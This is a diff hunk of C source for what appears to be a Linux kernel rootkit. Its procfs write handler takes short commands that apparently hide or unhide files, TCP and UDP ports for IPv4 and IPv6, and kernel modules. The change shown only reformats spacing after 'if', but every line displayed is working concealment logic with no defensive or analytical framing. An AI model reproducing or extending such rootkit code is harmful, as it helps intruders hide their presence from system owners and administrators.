@@ -97,69 +97,69 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
         clear_file_list();
     } else if (strncmp(buffer, "uf ", MIN(3, count)) == 0) {
         remove_from_file_list(buffer + 3, count - 3);
-    } else if(strncmp(buffer, "ht4s ", MIN(5, count)) == 0) {
+    } else if (strncmp(buffer, "ht4s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
         add_to_tcp4_list((int) port);
-    } else if(strncmp(buffer, "ut4s ", MIN(5, count)) == 0) {
+    } else if (strncmp(buffer, "ut4s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
         remove_from_tcp4_list((int) port);
-    } else if(strncmp(buffer, "ut4a", MIN(4, count)) == 0) {
+    } else if (strncmp(buffer, "ut4a", MIN(4, count)) == 0) {
         clear_tcp4_list();
-    } else if(strncmp(buffer, "ht6s ", MIN(5, count)) == 0) {
+    } else if (strncmp(buffer, "ht6s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
         add_to_tcp6_list((int) port);
-    } else if(strncmp(buffer, "ut6s ", MIN(5, count)) == 0) {
+    } else if (strncmp(buffer, "ut6s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
         remove_from_tcp6_list((int) port);
-    } else if(strncmp(buffer, "ut6a", MIN(4, count)) == 0) {
+    } else if (strncmp(buffer, "ut6a", MIN(4, count)) == 0) {
         clear_tcp6_list();
-    } else if(strncmp(buffer, "hu4s ", MIN(5, count)) == 0) {
+    } else if (strncmp(buffer, "hu4s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
         add_to_udp4_list((int) port);
-    } else if(strncmp(buffer, "uu4s ", MIN(5, count)) == 0) {
+    } else if (strncmp(buffer, "uu4s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
         remove_from_udp4_list((int) port);
-    } else if(strncmp(buffer, "uu4a", MIN(4, count)) == 0) {
+    } else if (strncmp(buffer, "uu4a", MIN(4, count)) == 0) {
         clear_udp4_list();
-    } else if(strncmp(buffer, "hu6s ", MIN(5, count)) == 0) {
+    } else if (strncmp(buffer, "hu6s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
         add_to_udp6_list((int) port);
-    } else if(strncmp(buffer, "uu6s ", MIN(5, count)) == 0) {
+    } else if (strncmp(buffer, "uu6s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
         remove_from_udp6_list((int) port);
-    } else if(strncmp(buffer, "uu6a", MIN(4, count)) == 0) {
+    } else if (strncmp(buffer, "uu6a", MIN(4, count)) == 0) {
         clear_udp6_list();
     } else if (strncmp(buffer, "hm ", MIN(3, count)) == 0) {
         add_to_module_list(buffer + 3, count - 3);
